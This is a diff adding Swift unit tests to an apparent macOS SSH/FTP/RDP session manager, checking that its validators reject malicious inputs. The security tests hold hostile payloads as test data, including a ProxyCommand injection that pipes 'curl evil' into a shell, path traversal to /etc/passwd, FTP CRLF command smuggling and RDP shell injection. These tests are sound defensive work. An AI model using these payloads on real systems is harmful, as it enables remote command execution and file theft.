@@ -374,3 +374,156 @@ final class HTTPServerTests: XCTestCase {
         XCTAssertEqual(String(data: data, encoding: .utf8), "contenido")
     }
 }
+
+@MainActor
+final class StoreCompatTests: XCTestCase {
+    func tmp() -> URL { FileManager.default.temporaryDirectory.appendingPathComponent("sd-store-\(UUID().uuidString).json") }
+
+    func testOldFileMissingNewFieldsStillLoads() throws {
+        let url = tmp()
+        let old = #"{"sessions":[{"id":"0B2F6C1A-0000-4000-8000-000000000001","name":"viejo","host":"h","kind":"ssh"}],"folders":[],"snippets":[],"savedTunnels":[],"version":1}"#
+        try old.write(to: url, atomically: true, encoding: .utf8)
+        let s = SessionStore(url: url)
+        XCTAssertEqual(s.sessions.count, 1); XCTAssertEqual(s.sessions[0].name, "viejo")
+        XCTAssertEqual(s.sessions[0].keepAlive, 30, "los campos que faltan toman su valor por defecto")
+    }
+
+    func testCorruptFileIsBackedUpNotOverwritten() throws {
+        let url = tmp()
+        try "{ esto no es json".write(to: url, atomically: true, encoding: .utf8)
+        let s = SessionStore(url: url)
+        XCTAssertTrue(s.sessions.isEmpty)
+        let dir = url.deletingLastPathComponent()
+        let backups = try FileManager.default.contentsOfDirectory(atPath: dir.path).filter { $0.hasPrefix("sessions.corrupt-") }
+        XCTAssertFalse(backups.isEmpty, "se guarda una copia del archivo ilegible")
+        backups.forEach { try? FileManager.default.removeItem(at: dir.appendingPathComponent($0)) }
+    }
+
+    func testBadElementDoesNotDropTheRest() throws {
+        let url = tmp()
+        let json = #"{"sessions":[{"name":"ok"},{"name":5,"kind":"inventado"},{"name":"ok2"}]}"#
+        try json.write(to: url, atomically: true, encoding: .utf8)
+        XCTAssertEqual(SessionStore(url: url).sessions.map(\.name), ["ok", "ok2"])
+    }
+
+    func testSavedFileIsOwnerOnly() async throws {
+        let url = tmp()
+        let s = SessionStore(url: url)
+        s.sessions.append(Session())
+        try await Task.sleep(nanoseconds: 900_000_000)
+        let perms = try FileManager.default.attributesOfItem(atPath: url.path)[.posixPermissions] as? Int
+        XCTAssertEqual(perms, 0o600)
+    }
+}
+
+final class MiniLinuxScriptTests: XCTestCase {
+    func testInitScriptHasValidShellSyntax() throws {
+        let f = FileManager.default.temporaryDirectory.appendingPathComponent("sd-init-\(UUID().uuidString).sh")
+        try MiniLinuxPersistence.initScript.write(to: f, atomically: true, encoding: .utf8)
+        defer { try? FileManager.default.removeItem(at: f) }
+        let p = Process(); p.executableURL = URL(fileURLWithPath: "/bin/sh"); p.arguments = ["-n", f.path]
+        let err = Pipe(); p.standardError = err; try p.run(); p.waitUntilExit()
+        XCTAssertEqual(p.terminationStatus, 0, String(decoding: err.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self))
+    }
+
+    func testSetupLineMountsBothSharesAndSizesTerminal() {
+        let l = MiniLinuxPersistence.setupLine(cols: 120, rows: 40)
+        XCTAssertTrue(l.contains("stty cols 120 rows 40")); XCTAssertTrue(l.contains("mount -t virtiofs persist /persist"))
+        XCTAssertTrue(l.contains("mount -t virtiofs mac /mnt/mac"))
+    }
+}
+
+@MainActor
+final class SecurityTests: XCTestCase {
+    func testOptionInjectionInHostOrUserIsRejected() {
+        for h in ["-oProxyCommand=touch /tmp/pwn", "-J", "host name", "a;b", "host\nProxyCommand x", "ho$(id)st", ""] {
+            var s = Session(); s.kind = .ssh; s.host = h
+            XCTAssertNotNil(s.validationError, "host «\(h)» debe rechazarse")
+        }
+        var u = Session(); u.host = "ok.example.com"; u.username = "-oProxyCommand=x"
+        XCTAssertNotNil(u.validationError)
+        var j = Session(); j.host = "ok.example.com"; j.jumpHost = "-oProxyCommand=x"
+        XCTAssertNotNil(j.validationError)
+        var good = Session(); good.host = "db-1.corp.example.com"; good.username = "admin@corp"
+        XCTAssertNil(good.validationError)
+        var v6 = Session(); v6.host = "[fe80::1%en0]"
+        XCTAssertNil(v6.validationError)
+    }
+
+    func testDoubleDashPrecedesHostInEverySSHInvocation() {
+        var s = TestServer.session(); s.host = "example.org"
+        let spec = SSHLauncher.spec(for: s, settings: AppSettingsData())
+        XCTAssertEqual(spec.args.suffix(2), ["--", "example.org"])
+        let sftp = SSHLauncher.sftpSubsystemArguments(s, hostKeyPolicy: "accept-new")
+        XCTAssertEqual(Array(sftp.suffix(4)), ["-s", "--", "example.org", "sftp"])
+    }
+
+    func testMaliciousSSHURLsAreRejected() {
+        let app = AppState(store: SessionStore(url: FileManager.default.temporaryDirectory.appendingPathComponent("sd-\(UUID()).json")), settings: AppSettings(url: FileManager.default.temporaryDirectory.appendingPathComponent("st-\(UUID()).json")))
+        for url in ["ssh://-oProxyCommand=calc@host", "ssh://user@-oProxyCommand=calc", "ssh://-F/etc/passwd"] {
+            let s = app.parseQuick(url)?.sanitizedForImport()
+            XCTAssertNotNil(s?.validationError, url)
+        }
+        let ok = app.parseQuick("ssh://ana@srv.example.com:2200/ruta")
+        XCTAssertEqual(ok?.host, "srv.example.com"); XCTAssertEqual(ok?.port, 2200); XCTAssertNil(ok?.validationError)
+    }
+
+    func testImportedSessionsLoseDangerousOptions() {
+        var s = Session(); s.extraArguments = "-oProxyCommand=curl evil|sh"; s.sharedFolder = "/Users"; s.name = "x\u{0}y"
+        let c = s.sanitizedForImport()
+        XCTAssertEqual(c.extraArguments, ""); XCTAssertEqual(c.sharedFolder, ""); XCTAssertEqual(c.name, "xy")
+        let store = SessionStore(url: FileManager.default.temporaryDirectory.appendingPathComponent("sd-\(UUID()).json"))
+        var raw = Session(); raw.extraArguments = "-oProxyCommand=evil"; raw.host = "h"
+        let data = try! JSONEncoder().encode(StoreData(sessions: [raw]))
+        XCTAssertEqual(store.importData(data), 1)
+        XCTAssertEqual(store.sessions.first?.extraArguments, "")
+    }
+
+    func testRemoteNamesCannotEscapeDownloadFolder() {
+        for bad in ["..", ".", "", "../etc/passwd", "a/b", "x\ny", "a\0b", "x\r\ny"] { XCTAssertFalse(SessionSafety.isSafeRemoteName(bad), bad) }
+        for good in ["file.txt", "con espacios.txt", ".hidden", "ñandú"] { XCTAssertTrue(SessionSafety.isSafeRemoteName(good), good) }
+        let listing = "-rw-r--r--   1 u g 10 Jan  1 12:00 ../../evil\n-rw-r--r--   1 u g 10 Jan  1 12:00 ok.txt"
+        XCTAssertEqual(FTPClient.parseListing(listing, in: "/").map(\.name), ["ok.txt"])
+    }
+
+    func testFTPCommandInjectionBlocked() {
+        XCTAssertFalse(SessionSafety.isSafeFTPPath("/a\r\nDELE /important"))
+        XCTAssertTrue(SessionSafety.isSafeFTPPath("/a/b c.txt"))
+    }
+
+    func testRDPFileCannotBeInjectedWithNewlines() {
+        var s = Session(); s.kind = .rdp; s.host = "10.0.0.1\r\nalternate shell:s:cmd.exe"; s.username = "u\nenablecredsspsupport:i:0"
+        let c = RDPLauncher.contents(for: s)
+        XCTAssertFalse(c.contains("\nalternate shell"), c); XCTAssertFalse(c.contains("\nenablecredsspsupport"), c)
+    }
+
+    func testNetworkToolsRejectOptionLikeHosts() {
+        XCTAssertEqual(NetworkTool.ping.command(host: "-f 127.0.0.1").0, "/bin/echo")
+        XCTAssertEqual(NetworkTool.dns.command(host: "+short").0, "/bin/echo")
+        XCTAssertEqual(NetworkTool.ping.command(host: "example.com").0, "/sbin/ping")
+    }
+
+    func testBrowserSessionOnlyHTTP() {
+        var s = Session(); s.kind = .browser; s.host = "file:///etc/passwd"
+        XCTAssertNotNil(s.validationError)
+        s.host = "https://panel.example.com"; XCTAssertNil(s.validationError)
+    }
+
+    func testControlDirIsPrivateAndOwned() {
+        let d = Paths.controlDir
+        var st = stat(); XCTAssertEqual(lstat(d, &st), 0)
+        XCTAssertEqual(st.st_uid, getuid()); XCTAssertEqual(st.st_mode & 0o777, 0o700)
+    }
+
+    func testHTTPServerLoopbackByDefault() async throws {
+        let root = FileManager.default.temporaryDirectory.appendingPathComponent("sd-http3-\(UUID().uuidString)")
+        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
+        let srv = HTTPFileServer()
+        try srv.start(folder: root, port: 28081)       // localOnly por defecto
+        defer { srv.stop() }
+        for _ in 0..<50 where !srv.running { try await Task.sleep(nanoseconds: 100_000_000) }
+        XCTAssertTrue(srv.running)
+        let (_, resp) = try await URLSession.shared.data(from: URL(string: "http://127.0.0.1:28081/")!)
+        XCTAssertEqual((resp as? HTTPURLResponse)?.statusCode, 200)
+    }
+}
